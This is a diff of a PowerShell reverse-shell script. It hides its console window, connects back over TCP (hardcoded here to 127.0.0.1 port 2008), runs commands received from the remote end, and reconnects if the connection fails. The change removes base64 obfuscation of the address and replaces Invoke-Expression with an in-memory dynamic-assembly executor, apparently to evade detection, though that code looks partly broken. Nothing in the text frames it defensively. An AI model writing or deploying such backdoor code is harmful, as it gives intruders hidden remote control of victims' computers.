@@ -1,8 +1,3 @@
-param (
-    [string]$ip,
-    [int]$port
-)
-
 # Function to hide the PowerShell window
 function Hide-Window {
     $code = @"
@@ -34,13 +29,24 @@ public class Window {
     [Window]::Hide()
 }
 
-function Connect-Back {
+function Invoke-InMemoryScript {
     param (
-        [string]$ip,
-        [int]$port
+        [string]$code
     )
+    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("InMemoryAssembly")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $module = $assembly.DefineDynamicModule("InMemoryModule")
+    $type = $module.DefineType("InMemoryType", "Public, Class")
+    $method = $type.DefineMethod("Execute", "Static, Public", [void], @([string]))
+    $generator = $method.GetILGenerator()
+    $generator.Emit(OpCodes.Ldstr, $code)
+    $generator.Emit(OpCodes.Call, [System.Management.Automation.ScriptBlock]::Create($code).GetType().GetMethod("Invoke", [System.Reflection.BindingFlags] "NonPublic, Instance"))
+    $generator.Emit(OpCodes.Ret)
+    $type.CreateType().GetMethod("Execute").Invoke($null, @($code))
+}
+
+function Connect-Back {
     try {
-        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 2008)
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
@@ -50,18 +56,17 @@ function Connect-Back {
             $data = $reader.ReadLine()
             if ($data) {
                 try {
-                    $output = Invoke-Expression $data 2>&1 | Out-String
+                    Invoke-InMemoryScript -code $data
                 } catch {
                     $output = $_.Exception.Message
+                    $writer.WriteLine($output)
+                    $writer.Flush()
                 }
-                $output = $output.Trim()
-                $writer.WriteLine($output)
-                $writer.Flush()
             }
         }
     } catch {
         Start-Sleep -Seconds 5
-        Connect-Back -ip $ip -port $port
+        Connect-Back
     } finally {
         if ($client.Connected) {
             $writer.Close()
@@ -71,20 +76,6 @@ function Connect-Back {
     }
 }
 
-function Obfuscate-String {
-    param ([string]$input)
-    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($input))
-    return $encoded
-}
-
-function Deobfuscate-String {
-    param ([string]$input)
-    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($input))
-    return $decoded
-}
-
 # Main execution
 Hide-Window
-$encodedIp = Obfuscate-String $ip
-$encodedPort = Obfuscate-String $port.ToString()
-Connect-Back -ip (Deobfuscate-String $encodedIp) -port ([int] (Deobfuscate-String $encodedPort))
+Connect-Back
